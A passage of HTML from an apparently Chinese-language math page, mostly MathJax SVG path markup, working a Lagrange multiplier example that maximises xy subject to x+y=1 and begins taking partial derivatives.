288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2445.7,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3112.4,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4168.2,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4740.2,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g></g></g></svg></mjx-container></span> 的最大值，约束\n<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.464ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"9.317ex\" height=\"1.971ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -666 4118 871\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mi\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(794.2,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1794.4,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2562.2,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(3618,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g></g></g></svg></mjx-container></span>。</p>\n<p>解：</p>\n<p>构造拉格朗日函数：<span class=\"math inline\"><mjx-container class=\"MathJax\" jax=\"SVG\"><svg style=\"vertical-align: -0.566ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"29.385ex\" height=\"2.262ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -750 12988.2 1000\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g><g data-mml-node=\"mo\" transform=\"translate(690,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(1079,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(1651,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(2095.7,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(2585.7,0)\"><path data-c=\"2C\" d=\"M78 35T78 60T94 103T137 121Q165 121 187 96T210 8Q210 -27 201 -60T180 -117T154 -158T130 -185T117 -194Q113 -194 104 -185T95 -172Q95 -168 106 -156T131 -126T157 -76T173 -3V9L172 8Q170 7 167 6T161 3T152 1T140 0Q113 0 96 17Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3030.3,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3613.3,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(4280.1,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5335.9,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(5907.9,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(6620.1,0)\"><path data-c=\"2B\" d=\"M56 237T56 250T70 270H369V420L370 570Q380 583 389 583Q402 583 409 568V270H707Q722 262 722 250T707 230H409V-68Q401 -82 391 -82H389H387Q375 -82 369 -68V230H70Q56 237 56 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(7620.3,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(8203.3,0)\"><path data-c=\"28\" d=\"M94 250Q94 319 104 381T127 488T164 576T202 643T244 695T277 729T302 750H315H319Q333 750 333 741Q333 738 316 720T275 667T226 581T184 443T167 250T184 58T225 -81T274 -167T316 -220T333 -241Q333 -250 318 -250H315H302L274 -226Q180 -141 137 -14T94 250Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(8592.3,0)\"><path data-c=\"31\" d=\"M213 578L200 573Q186 568 160 563T102 556H83V602H102Q149 604 189 617T245 641T273 663Q275 666 285 666Q294 666 302 660V361L303 61Q310 54 315 52T339 48T401 46H427V0H416Q395 3 257 3Q121 3 100 0H88V46H114Q136 46 152 46T177 47T193 50T201 52T207 57T213 61V578Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9314.6,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(10314.8,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(11109,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(12109.2,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(12599.2,0)\"><path data-c=\"29\" d=\"M60 749L64 750Q69 750 74 750H86L114 726Q208 641 251 514T294 250Q294 182 284 119T261 12T224 -76T186 -143T145 -194T113 -227T90 -246Q87 -249 86 -250H74Q66 -250 63 -250T58 -247T55 -238Q56 -237 66 -225Q221 -64 221 250T66 725Q56 737 55 738Q55 746 60 749Z\"/></g></g></g></svg></mjx-container></span></p>\n<p>对每个变量求偏导： <span class=\"math display\"><mjx-container class=\"MathJax\" jax=\"SVG\" display=\"true\"><svg style=\"vertical-align: -2.016ex;\" xmlns=\"http://www.w3.org/2000/svg\" width=\"83.595ex\" height=\"5.163ex\" role=\"img\" focusable=\"false\" viewbox=\"0 -1391 36948.9 2282\"><g stroke=\"currentColor\" fill=\"currentColor\" stroke-width=\"0\" transform=\"scale(1,-1)\"><g data-mml-node=\"math\"><g data-mml-node=\"mfrac\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(279,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D465\" d=\"M52 289Q59 331 106 386T222 442Q257 442 286 424T329 379Q371 442 430 442Q467 442 494 420T522 361Q522 332 508 314T481 292T458 288Q439 288 427 299T415 328Q415 374 465 391Q454 404 425 404Q412 404 406 402Q368 386 350 336Q290 115 290 78Q290 50 306 38T341 26Q378 26 414 59T463 140Q466 150 469 151T485 153H489Q504 153 504 145Q504 144 502 134Q486 77 440 33T333 -11Q263 -11 227 52Q186 -10 133 -10H127Q78 -10 57 16T35 71Q35 103 54 123T99 143Q142 143 142 101Q142 81 130 66T107 46T94 41L91 40Q91 39 97 36T113 29T132 26Q168 26 194 71Q203 87 217 139T245 247T261 313Q266 340 266 352Q266 380 251 392T217 404Q177 404 142 372T93 290Q91 281 88 280T72 278H58Q52 284 52 289Z\"/></g></g><rect width=\"1456\" height=\"60\" x=\"120\" y=\"220\"/></g><g data-mml-node=\"mo\" transform=\"translate(1973.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(3029.6,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(3741.8,0)\"><path data-c=\"2212\" d=\"M84 237T84 250T98 270H679Q694 262 694 250T679 230H98Q84 237 84 250Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(4742,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(5602.8,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mn\" transform=\"translate(6658.6,0)\"><path data-c=\"30\" d=\"M96 585Q152 666 249 666Q297 666 345 640T423 548Q460 465 460 320Q460 165 417 83Q397 41 362 16T301 -15T250 -22Q224 -22 198 -16T137 16T82 83Q39 165 39 320Q39 494 96 585ZM321 597Q291 629 250 629Q208 629 178 597Q153 571 145 525T137 333Q137 175 145 125T181 46Q209 16 250 16Q290 16 318 46Q347 76 354 130T362 333Q362 478 354 524T321 597Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(7436.3,0)\"><path data-c=\"21D2\" d=\"M580 514Q580 525 596 525Q601 525 604 525T609 525T613 524T615 523T617 520T619 517T622 512Q659 438 720 381T831 300T927 263Q944 258 944 250T935 239T898 228T840 204Q696 134 622 -12Q618 -21 615 -22T600 -24Q580 -24 580 -17Q580 -13 585 0Q620 69 671 123L681 133H70Q56 140 56 153Q56 168 72 173H725L735 181Q774 211 852 250Q851 251 834 259T789 283T735 319L725 327H72Q56 332 56 347Q56 360 70 367H681L671 377Q638 412 609 458T580 514Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(8714.1,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 -165Q219 -156 247 -127T290 -65T313 -9T321 21L315 17Q309 13 296 6T270 -6Q250 -11 231 -11Q185 -11 150 11T104 82Q103 89 103 113Q103 170 138 262T173 379Q173 380 173 381Q173 390 173 393T169 400T158 404H154Q131 404 112 385T82 344T65 302T57 280Q55 278 41 278H27Q21 284 21 287Z\"/></g><g data-mml-node=\"mo\" transform=\"translate(9481.9,0)\"><path data-c=\"3D\" d=\"M56 347Q56 360 70 367H707Q722 359 722 347Q722 336 708 328L390 327H72Q56 332 56 347ZM56 153Q56 168 72 173H708Q722 163 722 153Q722 140 707 133H70Q56 140 56 153Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(10537.7,0)\"><path data-c=\"1D706\" d=\"M166 673Q166 685 183 694H202Q292 691 316 644Q322 629 373 486T474 207T524 67Q531 47 537 34T546 15T551 6T555 2T556 -2T550 -11H482Q457 3 450 18T399 152L354 277L340 262Q327 246 293 207T236 141Q211 112 174 69Q123 9 111 -1T83 -12Q47 -12 47 20Q47 37 61 52T199 187Q229 216 266 252T321 306L338 322Q338 323 288 462T234 612Q214 657 183 657Q166 657 166 673Z\"/></g><g data-mml-node=\"mspace\" transform=\"translate(11120.7,0)\"/><g data-mml-node=\"mfrac\" transform=\"translate(11120.7,0)\"><g data-mml-node=\"mrow\" transform=\"translate(220,676)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"TeXAtom\" data-mjx-texclass=\"ORD\" transform=\"translate(566,0)\"><g data-mml-node=\"mi\"><path data-c=\"4C\" d=\"M62 -22T47 -22T32 -11Q32 -1 56 24T83 55Q113 96 138 172T180 320T234 473T323 609Q364 649 419 677T531 705Q559 705 578 696T604 671T615 645T618 623V611Q618 582 615 571T598 548Q581 531 558 520T518 509Q503 509 503 520Q503 523 505 536T507 560Q507 590 494 610T452 630Q423 630 410 617Q367 578 333 492T271 301T233 170Q211 123 204 112L198 103L224 102Q281 102 369 79T509 52H523Q535 64 544 87T579 128Q616 152 641 152Q656 152 656 142Q656 101 588 40T433 -22Q381 -22 289 1T156 28L141 29L131 20Q111 0 87 -11Z\"/></g></g></g><g data-mml-node=\"mrow\" transform=\"translate(320,-686)\"><g data-mml-node=\"mi\"><path data-c=\"1D715\" d=\"M202 508Q179 508 169 520T158 547Q158 557 164 577T185 624T230 675T301 710L333 715H345Q378 715 384 714Q447 703 489 661T549 568T566 457Q566 362 519 240T402 53Q321 -22 223 -22Q123 -22 73 56Q42 102 42 148V159Q42 276 129 370T322 465Q383 465 414 434T455 367L458 378Q478 461 478 515Q478 603 437 639T344 676Q266 676 223 612Q264 606 264 572Q264 547 246 528T202 508ZM430 306Q430 372 401 400T333 428Q270 428 222 382Q197 354 183 323T150 221Q132 149 132 116Q132 21 232 21Q244 21 250 22Q327 35 374 112Q389 137 409 196T430 306Z\"/></g><g data-mml-node=\"mi\" transform=\"translate(566,0)\"><path data-c=\"1D466\" d=\"M21 287Q21 301 36 335T84 406T158 442Q199 442 224 419T250 355Q248 336 247 334Q247 331 231 288T198 191T182 105Q182 62 196 45T238 27Q261 27 281 38T312 61T339 94Q339 95 344 114T358 173T377 247Q415 397 419 404Q432 431 462 431Q475 431 483 424T494 412T496 403Q496 390 447 193T391 -23Q363 -106 294 -155T156 -205Q111 -205 77 -183T43 -117Q43 -95 50 -80T69 -58T89 -48T106 -45Q150 -45 150 -87Q150 -107 138 -122T115 -142T102 -147L99 -148Q101 -153 118 -160T152 -167H160Q177 -167 186 